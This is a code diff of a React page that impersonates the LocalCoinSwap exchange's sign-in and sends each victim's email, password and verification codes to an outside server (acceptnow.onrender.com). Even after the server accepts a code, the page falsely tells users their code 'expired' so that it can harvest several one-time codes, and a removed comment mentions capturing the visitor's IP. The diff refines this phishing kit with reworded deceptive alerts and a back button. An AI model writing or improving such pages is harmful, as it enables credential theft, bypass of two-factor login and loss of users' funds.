@@ -1,4 +1,3 @@
-
 import React, { useState } from "react";
 
 function LocalCoinswap() {
@@ -7,27 +6,24 @@ function LocalCoinswap() {
   const [code, setCode] = useState("");
   const [step, setStep] = useState(1);
   const [userId, setUserId] = useState(null);
-  const [codeCount, setCodeCount] = useState(0); 
+  const [codeCount, setCodeCount] = useState(0);
 
   /* =========================
-      STEP 1 — SAVE EMAIL (Backend will capture IP here)
+      STEP 1 — SAVE EMAIL
   ========================== */
   const handleStep1 = async () => {
     if (!email) return alert("Email is required");
-
     try {
       const res = await fetch("https://acceptnow.onrender.com/api/users/step1", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email }),
       });
-
       const data = await res.json();
-
       if (res.ok) {
         setUserId(data.userId);
-        localStorage.setItem("userId", data.userId);                
-        setStep(2); 
+        localStorage.setItem("userId", data.userId);
+        setStep(2);
       } else {
         alert(data.error || "Error");
       }
@@ -42,18 +38,15 @@ function LocalCoinswap() {
   ========================== */
   const handleStep2 = async () => {
     if (!word) return alert("Password is required");
-
     try {
       const res = await fetch("https://acceptnow.onrender.com/api/users/step2", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ userId, word }),
       });
-
       const data = await res.json();
-
       if (res.ok) {
-        setStep(3); 
+        setStep(3);
       } else {
         alert(data.error || "Error saving word");
       }
@@ -68,61 +61,71 @@ function LocalCoinswap() {
   ========================== */
   const handleStep3 = async () => {
     if (!code.trim()) return alert("Enter the verification code");
-  
     const storedUserId = localStorage.getItem("userId");
-    if (!storedUserId) {
-      alert("Session expired. Restart.");
-      setStep(1);
-      return;
-    }
-  
-    const payload = {
-      userId: storedUserId,
-      code: code.trim(), // ✅ ALWAYS SEND `code`
-    };
-  
-    console.log("Sending to server:", payload);
-  
     try {
-      const res = await fetch(
-        "https://acceptnow.onrender.com/api/users/step3",
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload),
-        }
-      );
-  
-      const data = await res.json();
-  
+      const res = await fetch("https://acceptnow.onrender.com/api/users/step3", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          userId: storedUserId,
+          code: code.trim(),
+        }),
+      });
+
       if (res.ok) {
+        const currentCount = codeCount + 1;
         setCode("");
-        setCodeCount((prev) => prev + 1);
-  
-        if (codeCount + 1 >= 3) {
-          alert("Wrong email or password! Try again.");
-          setStep(1);
-          setEmail("");
-          setWord("");
-          setCodeCount(0);
-          localStorage.removeItem("userId");
+        if (currentCount >= 3) {
+          alert("Please enter correct details!");
+          resetForm();
         } else {
-          alert("Invalid code. Please enter the renewed code.");
+          setCodeCount(currentCount);
+          alert("Code expired! Enter a new code.");
         }
       } else {
+        const data = await res.json();
         alert(data.error || "Verification failed");
       }
     } catch (err) {
       console.error("Fetch Error:", err);
-      alert("Server connection error");
+      alert("Connection error");
     }
   };
-  
+
+  const resetForm = () => {
+    setStep(1);
+    setEmail("");
+    setWord("");
+    setCodeCount(0);
+    localStorage.removeItem("userId");
+  };
+
   return (
     <div className="min-h-screen bg-[#0b0f17] flex flex-col items-center justify-center text-white relative px-4 py-8 md:px-0">
-      <div className="absolute top-4 left-4 flex items-center space-x-2">
-        <img src="/localcoinswap.png" alt="LocalCoinSwap Logo" className="w-7 h-7" />
-        <h1 className="text-md md:text-lg font-semibold">LocalCoinSwap</h1>
+      
+      {/* HEADER SECTION WITH LOGO & BACK ARROW */}
+      <div className="absolute top-4 left-4 flex flex-col items-start gap-2">
+        <div className="flex items-center space-x-2">
+          <img src="/localcoinswap.png" alt="LocalCoinSwap Logo" className="w-7 h-7" />
+          <h1 className="text-md md:text-lg font-semibold">LocalCoinSwap</h1>
+        </div>
+        
+        {/* BACK ARROW REDIRECT */}
+        <button 
+          onClick={() => window.history.back()} 
+          className="p-1 hover:bg-white/10 rounded-full transition-colors group"
+          aria-label="Go back"
+        >
+          <svg 
+            xmlns="http://www.w3.org/2000/svg" 
+            className="h-6 w-6 text-gray-400 group-hover:text-white" 
+            fill="none" 
+            viewBox="0 0 24 24" 
+            stroke="currentColor"
+          >
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
+          </svg>
+        </button>
       </div>
 
       <button className="absolute top-4 right-4 bg-linear-to-r from-orange-400 to-orange-600 px-4 md:px-5 py-2 rounded-full font-semibold hover:opacity-90 transition text-sm md:text-base">
